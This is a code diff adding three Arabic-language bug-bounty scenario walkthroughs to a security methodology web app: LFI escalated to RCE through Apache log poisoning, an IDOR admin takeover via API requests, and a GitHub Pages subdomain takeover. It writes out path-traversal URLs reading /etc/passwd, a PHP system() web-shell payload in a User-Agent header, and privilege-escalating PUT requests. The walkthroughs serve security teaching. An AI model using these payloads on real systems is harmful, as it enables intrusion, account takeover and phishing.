@@ -2533,6 +2533,25 @@
         </div>
       </div>
 
+      <!-- Category 5: Hacker Scenarios -->
+      <div class="sidebar-category">
+        <div class="category-title" onclick="toggleCategory('cat-scenarios')">
+          <span>🎬 HACKER SCENARIOS</span>
+          <span>▼</span>
+        </div>
+        <div class="category-items" id="cat-scenarios">
+          <div class="meth-item" id="meth-ef-p_scen_rce" onclick="openMethPhase('p_scen_rce')" data-search="scenario rce remote code execution lfi log poisoning">
+            <span>├── 💥</span> <span>LFI to RCE Scenario</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_scen_rce', '💥 LFI to RCE Scenario')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-p_scen_idor" onclick="openMethPhase('p_scen_idor')" data-search="scenario idor access control api parameter tampering">
+            <span>├── 🔑</span> <span>IDOR Admin Takeover</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_scen_idor', '🔑 IDOR Admin Takeover')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-p_scen_takeover" onclick="openMethPhase('p_scen_takeover')" data-search="scenario subdomain takeover cname dns hijacking github pages">
+            <span>└── 🏳️</span> <span>Subdomain Takeover</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_scen_takeover', '🏳️ Subdomain Takeover')">★</button>
+          </div>
+        </div>
+      </div>
+
     </div>
 
     <!-- Right Viewer: Dynamic Content Panes -->
@@ -4291,6 +4310,143 @@ Content-Type: application/json
               <input type="text" id="termInput" class="term-field" placeholder="Enter command..." autofocus>
             </div>
           </div>
+        </div>
+      </div>
+
+      <!-- Scenario 1: LFI to RCE via Log Poisoning -->
+      <div class="meth-content-view" id="meth-content-p_scen_rce" style="display: none; --tool-color: #ff3366;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">💥</span> LFI to RCE Scenario</h2>
+          <p class="hero-tagline">سيناريو استغلال ثغرة قراءة الملفات المحلية للوصول للتحكم الكامل بالنظام عبر تسميم سجلات الخادم (Log Poisoning)</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🎯 Scenario Overview (ملخص السيناريو)</h3></div>
+          <p>أثناء فحص موقع مستهدف، تم اكتشاف معامل (parameter) يقوم بتحميل صفحات بشكل ديناميكي، ومن خلاله تم العثور على ثغرة <strong>Local File Inclusion (LFI)</strong>. ومن ثم قمنا بترقية الثغرة إلى <strong>Remote Code Execution (RCE)</strong> لتنفيذ الأوامر عن بعد عن طريق Log Poisoning.</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚙️ Step-by-Step Walkthrough (خطوات السيناريو)</h3></div>
+          <ul class="t-check-list" style="list-style: none; padding: 0;">
+            <li style="margin-bottom: 12px;">
+              <strong>1. اكتشاف قراءة الملفات (Discovery):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">طلبنا الرابط التالي لقراءة ملف passwd الخاص بالنظام:</p>
+              <code style="display: block; background: rgba(3,3,8,0.5); padding: 8px; border-radius: 4px; color: var(--accent-cyan); margin: 6px 0 0 10px;">/view.php?file=../../../../etc/passwd</code>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>2. تحديد سجلات خادم أباتشي (Finding Access Logs):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">حاولنا قراءة سجلات الخادم Apache Access Logs للتأكد من إمكانية الوصول لها وقراءتها:</p>
+              <code style="display: block; background: rgba(3,3,8,0.5); padding: 8px; border-radius: 4px; color: var(--accent-cyan); margin: 6px 0 0 10px;">/view.php?file=../../../../var/log/apache2/access.log</code>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>3. تسميم السجلات (Poisoning the User-Agent):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">أرسلنا طلباً عادياً للموقع وقمنا بحقن كود PHP خبيث داخل ترويسة User-Agent ليتم تسجيله في الـ logs:</p>
+              <code style="display: block; background: rgba(3,3,8,0.5); padding: 8px; border-radius: 4px; color: var(--accent-cyan); margin: 6px 0 0 10px;">User-Agent: &lt;?php system($_GET[\'cmd\']); ?&gt;</code>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>4. تنفيذ الأوامر (Command Execution):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">الآن، استدعينا ملف السجلات المسموم مع تمرير المتغير cmd لتشغيل أوامر النظام بنجاح:</p>
+              <code style="display: block; background: rgba(3,3,8,0.5); padding: 8px; border-radius: 4px; color: var(--accent-cyan); margin: 6px 0 0 10px;">/view.php?file=../../../../var/log/apache2/access.log&amp;cmd=id;whoami</code>
+            </li>
+          </ul>
+        </div>
+
+        <div class="cyber-card" style="border: 1px solid rgba(255, 51, 102, 0.15); background: rgba(255, 51, 102, 0.02);">
+          <div class="card-header"><h3 style="color: #ff3366;">🔒 Impact & Bounty Reward</h3></div>
+          <p><strong>التأثير (Impact):</strong> اختراق كامل للنظام (RCE) مع إمكانية الوصول إلى الملفات الحساسة وقاعدة البيانات والشبكة الداخلية.</p>
+          <p><strong>المكافأة المتوقعة (Bounty):</strong> <span class="text-neon-green">$3,000 - $5,000</span></p>
+        </div>
+      </div>
+
+      <!-- Scenario 2: IDOR Admin Takeover -->
+      <div class="meth-content-view" id="meth-content-p_scen_idor" style="display: none; --tool-color: #ffaa00;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🔑</span> IDOR Admin Takeover</h2>
+          <p class="hero-tagline">تغيير بارامترات الواجهة الخلفية للـ API لتخطي الصلاحيات وتعديل بيانات مستخدمين آخرين أو الترقية لمدير</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🎯 Scenario Overview (ملخص السيناريو)</h3></div>
+          <p>يعتمد هذا السيناريو على ثغرة <strong>Insecure Direct Object Reference (IDOR)</strong> مدمجة مع <strong>Broken Object Level Authorization (BOLA)</strong> للوصول إلى لوحة التحكم الإدارية عبر التلاعب بمعرفات المستخدمين في طلبات الـ API.</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚙️ Step-by-Step Walkthrough (خطوات السيناريو)</h3></div>
+          <ul class="t-check-list" style="list-style: none; padding: 0;">
+            <li style="margin-bottom: 12px;">
+              <strong>1. التقاط طلب تحديث الحساب:</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">عند تحديث الاسم الشخصي في الحساب، لاحظنا إرسال الطلب التالي:</p>
+              <pre style="background: rgba(3,3,8,0.5); padding: 10px; border-radius: 4px; color: var(--accent-cyan); font-family: monospace; font-size:0.85rem; margin: 6px 0 0 10px;">
+PUT /api/v1/users/453/profile HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"name": "Attacker", "role": "user"}</pre>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>2. التلاعب بالمعرف وصلاحية المستخدم:</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">حاولنا تعديل معرف المستخدم إلى حساب الضحية (المدير 1) مع إضافة صلاحية admin:</p>
+              <pre style="background: rgba(3,3,8,0.5); padding: 10px; border-radius: 4px; color: var(--accent-cyan); font-family: monospace; font-size:0.85rem; margin: 6px 0 0 10px;">
+PUT /api/v1/users/1/profile HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"name": "Attacker Takeover", "role": "admin"}</pre>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>3. الاستجابة والنجاح (Success & Bypass):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">أرجع الخادم رد <code>HTTP/1.1 200 OK</code> وتم تطبيق التعديلات بنجاح على حساب المدير ورفع صلاحيتنا بدون أي تحقق من صلاحية الجلسة الحالية.</p>
+            </li>
+          </ul>
+        </div>
+
+        <div class="cyber-card" style="border: 1px solid rgba(255, 170, 0, 0.15); background: rgba(255, 170, 0, 0.02);">
+          <div class="card-header"><h3 style="color: #ffaa00;">🔒 Impact & Bounty Reward</h3></div>
+          <p><strong>التأثير (Impact):</strong> السيطرة الكاملة على حساب الإدارة (Admin Privilege Escalation) والتحكم في النظام ومستخدميه.</p>
+          <p><strong>المكافأة المتوقعة (Bounty):</strong> <span class="text-neon-green">$2,500 - $4,000</span></p>
+        </div>
+      </div>
+
+      <!-- Scenario 3: Subdomain Takeover -->
+      <div class="meth-content-view" id="meth-content-p_scen_takeover" style="display: none; --tool-color: #00ff66;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🏳️</span> Subdomain Takeover</h2>
+          <p class="hero-tagline">الاستيلاء على نطاق فرعي معلق يشير إلى خدمة سحابية غير مهيأة (أو تم مسحها) واستخدامه في الهندسة الاجتماعية</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🎯 Scenario Overview (ملخص السيناريو)</h3></div>
+          <p>تحدث هذه الثغرة عندما يترك المطورون سجل DNS CNAME يشير إلى مستودع أو منصة سحابية (مثل GitHub Pages أو S3) بعد حذف الحساب أو الخدمة، مما يسمح لأي شخص بالاستيلاء عليها وإعادة تسجيلها.</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚙️ Step-by-Step Walkthrough (خطوات السيناريو)</h3></div>
+          <ul class="t-check-list" style="list-style: none; padding: 0;">
+            <li style="margin-bottom: 12px;">
+              <strong>1. العثور على النطاق الفرعي المعلق (Discovery):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">أثناء تصفح النطاقات الفرعية المجمعة، لاحظنا أن النطاق الفرعي <code>status.target.com</code> يعطي خطأ:</p>
+              <code style="display: block; background: rgba(3,3,8,0.5); padding: 8px; border-radius: 4px; color: var(--accent-cyan); margin: 6px 0 0 10px;">404: There isn't a GitHub Pages site here.</code>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>2. فحص سجلات الـ DNS (Querying CNAME):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">قمنا بعمل استعلام DNS للتأكد من مسار التوجيه:</p>
+              <code style="display: block; background: rgba(3,3,8,0.5); padding: 8px; border-radius: 4px; color: var(--accent-cyan); margin: 6px 0 0 10px;">dig status.target.com CNAME --&gt; status.target.com points to target-status.github.io</code>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>3. الاستيلاء على النطاق (Takeover Step):</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">توجهنا إلى حسابنا في GitHub، وأنشأنا مستودعاً جديداً (repository)، وقمنا بإضافة ملف <code>CNAME</code> يحتوي على الاسم <code>status.target.com</code> في إعدادات مستودع GitHub Pages.</p>
+            </li>
+            <li style="margin-bottom: 12px;">
+              <strong>4. النتيجة والسيطرة:</strong>
+              <p style="margin: 4px 0 0 10px; color: var(--text-secondary);">عند زيارة <code>status.target.com</code> الآن، نجد أنه يعرض صفحتنا المخصصة بالكامل وتحت نفس الدومين الموثوق للشركة.</p>
+            </li>
+          </ul>
+        </div>
+
+        <div class="cyber-card" style="border: 1px solid rgba(0, 255, 102, 0.15); background: rgba(0, 255, 102, 0.02);">
+          <div class="card-header"><h3 style="color: #00ff66;">🔒 Impact & Bounty Reward</h3></div>
+          <p><strong>التأثير (Impact):</strong> القدرة على تنفيذ هجمات Phishing موثوقة وسرقة ملفات تعريف الارتباط للمستخدمين (Cookies Session Hijacking) وتشويه الموقع.</p>
+          <p><strong>المكافأة المتوقعة (Bounty):</strong> <span class="text-neon-green">$1,000 - $2,500</span></p>
         </div>
       </div>
 
